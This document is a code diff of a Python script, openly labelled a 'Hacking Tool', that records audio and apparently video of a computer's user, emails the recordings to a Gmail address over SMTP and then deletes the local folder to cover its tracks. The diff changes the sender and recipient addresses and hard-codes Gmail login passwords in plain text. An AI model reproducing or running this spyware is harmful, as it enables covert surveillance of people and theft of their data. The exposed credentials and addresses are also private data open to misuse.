@@ -1,7 +1,7 @@
 
 from shutil import copyfile
 import os, time, cv2, pyautogui
-import threading, zipfile
+import threading
 import numpy as np
 import sounddevice as sd
 from scipy.io.wavfile import write
@@ -22,11 +22,10 @@ except:
 
 filename3 = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//recording.mp3'
 filename4 = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//recording.mkv'
-# filename = 'C://Users' + f'//{os.getlogin()}' + '//Documents//Hacking Tool//hacked.zip'
 
 # ============================================
 
-duration = 100
+duration = 10
 
 def audiorec(duration):
     freq = 44100
@@ -73,8 +72,8 @@ def hacked(filename):
         from email.mime.base import MIMEBase
         from email import encoders
 
-        fromaddr = "imvickykumar999@gmail.com"
-        toaddr = ["hellovickykumar123@gmail.com", fromaddr][1]
+        fromaddr = "sagar.sws2000@gmail.com"
+        toaddr = ["imvickykumar999@gmail.com", fromaddr][1]
 
         msg = MIMEMultipart()
         msg['From'] = fromaddr
@@ -97,7 +96,7 @@ def hacked(filename):
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
         try:
-            s.login(fromaddr, "@Hey_Vicks")
+            s.login(fromaddr, "Sagarsws2000@")
         except Exception as e:
             # print(e)
             pass
@@ -125,20 +124,10 @@ t2.join()
 
 # ===================================================
 
-# os.startfile(filename3)
-# os.startfile(filename4)
-
-# def zipdir(path, ziph):
-#     for root, dirs, files in os.walk(path):
-#         for file in files:
-#             ziph.write(os.path.join(root, file))
-#
-# zipf = zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED)
-# zipdir(pathack, zipf)
-# zipf.close()
+os.startfile(filename3)
+os.startfile(filename4)
 
 hacked(filename3)
 hacked(filename4)
 
-# hacked(filename)
 shutil.rmtree(pathack)
